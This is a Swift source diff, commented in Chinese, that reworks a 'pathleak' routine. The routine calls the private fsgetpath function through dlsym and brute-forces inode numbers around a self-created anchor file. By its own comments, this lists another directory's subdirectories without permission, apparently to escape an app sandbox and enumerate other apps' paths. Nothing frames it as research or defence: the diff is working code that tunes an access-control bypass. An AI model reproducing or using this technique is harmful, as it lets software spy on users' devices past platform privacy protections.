@@ -125,37 +125,56 @@ enum WQ {
         return nil
     }
 
-    /// pathleak：暴力 fsgetpath 扫 inode，列出 dir 的直接子目录（无需权限）
-    static func pathleak(_ dir: String, deadline: Date, maxInodes: UInt64 = 3_000_000) -> [String] {
+    /// pathleak v2：锚点自校验 + 围绕锚点开窗扫描（APFS inode 非从1连续）
+    /// 返回 (命中子目录路径, 诊断文本, 是否扫完)
+    static func pathleak(_ dir: String, deadline: Date, hardCap: UInt64 = 4_000_000) -> ([String], String, Bool) {
         var sfs = statfs()
-        guard statfs(dir, &sfs) == 0 else { return [] }
+        guard statfs(dir, &sfs) == 0 else { return ([], "statfs 失败", false) }
         var fsid = sfs.f_fsid
-        // 借新建文件的 inode 估上界
-        var upper = maxInodes
-        let doc = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).first ?? NSTemporaryDirectory()
-        let marker = doc + "/.wq.\(String(UUID().uuidString.prefix(6)))"
-        FileManager.default.createFile(atPath: marker, contents: Data())
-        var ms = stat()
-        if stat(marker, &ms) == 0, ms.st_ino > 4096 { upper = min(maxInodes, UInt64(ms.st_ino) + 4096) }
-        try? FileManager.default.removeItem(atPath: marker)
-        guard let libc = dlopen(nil, RTLD_NOW),
-              let sym = dlsym(libc, "fsgetpath") else { return [] }
+        guard let libc = dlopen(nil, RTLD_NOW), let sym = dlsym(libc, "fsgetpath") else {
+            return ([], "fsgetpath 符号找不到", false)
+        }
         typealias FGP = @convention(c) (UnsafeMutableRawPointer?, Int, UnsafePointer<fsid_t>, UInt64) -> ssize_t
         let fgp = unsafeBitCast(sym, to: FGP.self)
         let buf = UnsafeMutablePointer<CChar>.allocate(capacity: 1024)
         defer { buf.deallocate() }
+
+        // 锚点：自己 Documents 新建文件的 inode，并反查自校验
+        let doc = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).first ?? NSTemporaryDirectory()
+        let marker = doc + "/.wq.\(String(UUID().uuidString.prefix(6)))"
+        FileManager.default.createFile(atPath: marker, contents: Data())
+        var ms = stat()
+        var anchor: UInt64 = 0
+        if stat(marker, &ms) == 0 { anchor = UInt64(ms.st_ino) }
+        var selfOK = false
+        if anchor > 0 {
+            let n0 = fgp(buf, 1024, &fsid, anchor)
+            if n0 > 0 { selfOK = String(cString: buf).contains(".wq.") }
+        }
+        try? FileManager.default.removeItem(atPath: marker)
+        guard anchor > 0, selfOK else {
+            return ([], "自校验失败 anchor=\(anchor)", false)
+        }
+        // 窗口：向下到 1（早期安装），向上 anchor+60万（近期安装）
+        let lo: UInt64 = 1
+        let hi = min(hardCap, anchor + 600_000)
+
         let clean = dir.hasSuffix("/") ? String(dir.dropLast()) : dir
         var out: [String] = []
-        var ino: UInt64 = 1
         var seen = Set<String>()
-        while ino <= upper {
-            if ino % 30_000 == 0, Date() > deadline { break }
+        var probes: UInt64 = 0
+        var ino = lo
+        var done = true
+        while ino <= hi {
+            if (probes & 32767) == 0, Date() > deadline { done = false; break }
+            probes &+= 1
             let n = fgp(buf, 1024, &fsid, ino)
             if n > 0 {
                 let s = String(cString: buf)
-                if s.count > clean.count + 10, s.hasPrefix(clean), s[clean.index(clean.startIndex, offsetBy: clean.count)] == "/" {
+                if s.count > clean.count + 10, s.hasPrefix(clean) {
                     let rest = String(s.dropFirst(clean.count + 1))
-                    if !rest.isEmpty, !rest.contains("/"), !seen.contains(rest) {
+                    if s[s.index(s.startIndex, offsetBy: clean.count)] == "/",
+                       !rest.isEmpty, !rest.contains("/"), !seen.contains(rest) {
                         seen.insert(rest)
                         out.append(s)
                     }
@@ -163,7 +182,7 @@ enum WQ {
             }
             ino &+= 1
         }
-        return out
+        return (out, "anchor=\(anchor) 窗口[1,\(hi)] 探了\(probes) 中\(out.count) 扫完=\(done)", done)
     }
 
     static func release(_ handle: Int64) {
